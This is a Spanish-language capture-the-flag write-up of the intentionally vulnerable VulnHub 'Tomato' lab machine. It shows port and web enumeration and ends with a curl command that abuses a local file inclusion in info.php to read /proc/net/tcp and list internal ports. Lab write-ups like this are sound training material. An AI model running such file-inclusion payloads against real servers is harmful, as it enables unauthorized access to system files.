---
description: >-
  Writeup de la máquina de dificultad fácil Tomato de la página https://vulnhub.com
title: VulnHub - Tomato | (Difficulty Easy) - Linux
date: 2025-02-03
categories: [VulnHub, Writeup]
tags: [vulnhub, hacking, linux, easy, writeup, redteam, pentesting]
image_post: true
image: https://github.com/user-attachments/assets/a573c604-628b-4722-9841-e730b529ce55
---

## Useful Skills

* FTP Enumeration
* Web enumeration
* Local File Inclusion through info.php file
* Internal Port Discovery through LFI (/proc/net/tcp)
* LFI to RCE via PHP filter chain generator


## Enumeration

### TCP Scan

 ```bash
rustscan -a 192.168.2.139 --ulimit 5000 -g
192.168.2.139 -> [21,2211,80,8888]
```

```bash
nmap -p21,2211,80,8888 -sCV 192.168.2.139 -oN tcpScan
Starting Nmap 7.94SVN ( https://nmap.org ) at 2025-02-03 18:26 CET
Nmap scan report for 192.168.2.139
Host is up (0.00033s latency).

PORT     STATE SERVICE VERSION
21/tcp   open  ftp     vsftpd 3.0.3
80/tcp   open  http    Apache httpd 2.4.18 ((Ubuntu))
|_http-server-header: Apache/2.4.18 (Ubuntu)
|_http-title: Tomato
2211/tcp open  ssh     OpenSSH 7.2p2 Ubuntu 4ubuntu2.10 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 d2:53:0a:91:8c:f1:a6:10:11:0d:9e:0f:22:f8:49:8e (RSA)
|   256 b3:12:60:32:48:28:eb:ac:80:de:17:d7:96:77:6e:2f (ECDSA)
|_  256 36:6f:52:ad:fe:f7:92:3e:a2:51:0f:73:06:8d:80:13 (ED25519)
8888/tcp open  http    nginx 1.10.3 (Ubuntu)
|_http-title: 401 Authorization Required
| http-auth: 
| HTTP/1.1 401 Unauthorized\x0D
|_  Basic realm=Private Property
|_http-server-header: nginx/1.10.3 (Ubuntu)
MAC Address: 00:0C:29:30:C0:ED (VMware)
Service Info: OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 10.31 seconds
```

### UDP Scan

 ```bash
nmap -sU --top-ports 1500 --min-rate 5000 -n -Pn 192.168.2.139 -oN udpScan
Starting Nmap 7.94SVN ( https://nmap.org ) at 2025-02-03 18:27 CET
Nmap scan report for 192.168.2.139
Host is up (0.00027s latency).
Not shown: 1494 open|filtered udp ports (no-response)
PORT      STATE  SERVICE
17302/udp closed unknown
18683/udp closed unknown
28476/udp closed unknown
31365/udp closed unknown
32469/udp closed unknown
41702/udp closed unknown
MAC Address: 00:0C:29:30:C0:ED (VMware)

Nmap done: 1 IP address (1 host up) scanned in 0.91 seconds
```

### FTP Enumeration

La versión de FTP es vsftpd 3.0.3, busco posibles vulnerabilidades o exploits pero no encuentro nada interesante, por otro lado aunque nmap no me ha reportado anonymous login me intento loguear como anonymous, pero no obtengo nada, por lo que de momento el vector de ataque por FTP concluye 

### HTTP Enumeration

Whatweb no reporta nada interesante por el puerto 80/tcp HTTP

```bash
whatweb http://192.168.2.139
http://192.168.2.139 [200 OK] Apache[2.4.18], Country[RESERVED][ZZ], HTTPServer[Ubuntu Linux][Apache/2.4.18 (Ubuntu)], IP[192.168.2.139], Title[Tomato]
```

Accediendo a la página en http://192.168.2.139 puedo observar una foto de un tomate

![imagen](https://github.com/user-attachments/assets/f0eab1be-a69e-4c63-9fcc-3d324e20cf4b)

Utilizo gobuster para realizar una enumeración exahustiva de directorios

```bash
gobuster dir -u http://192.168.2.139 -w /usr/share/seclists/Discovery/Web-Content/common.txt -t 100 -q
/.htaccess            (Status: 403) [Size: 278]
/antibot_image        (Status: 301) [Size: 322] [--> http://192.168.2.139/antibot_image/]
/.hta                 (Status: 403) [Size: 278]
/index.html           (Status: 200) [Size: 652]
/server-status        (Status: 403) [Size: 278]
/.htpasswd            (Status: 403) [Size: 278]
```

Observo un directorio llamado /antibot-image el cual es bastante llamativo, por que el resto de los resultado no llaman mucho la atención, accedo al mismo puediendo observar un directory listing con un directorio llamado antibots

![imagen](https://github.com/user-attachments/assets/721422cf-233e-4752-97ed-5b9a54823cab)

Accedo a /antibots y observo múltiples archivos PHP y directorios, uno de los archivo que capta mi atención es info.php, este archivo es el que permite mostrar información detallada sobre la configuración de PHP en un servidor.

![imagen](https://github.com/user-attachments/assets/3886314a-6676-4ea0-936f-4f08775e2d9b)

![imagen](https://github.com/user-attachments/assets/de50b33c-0f05-4ef5-8570-744e4d3de929)

![imagen](https://github.com/user-attachments/assets/60ebb5cd-4f95-4b1b-b627-99e08a7b09e5)

![imagen](https://github.com/user-attachments/assets/174aabe9-a42d-4532-8eed-f7fd8d671a00)

```bash
curl -s -X GET http://192.168.2.139/antibot_image/antibots/info.php/\?image\=/proc/net/tcp | grep "</body></html>" -A 1000 |
sed 's/<\/div><\/body><\/html>//' | awk '{print $2}' | grep -v local_address | cut -d : -f 2 | sort -u |
while read port; do echo "Port -> $((0x$port))";done
Port -> 80
Port -> 2211
Port -> 8888
```
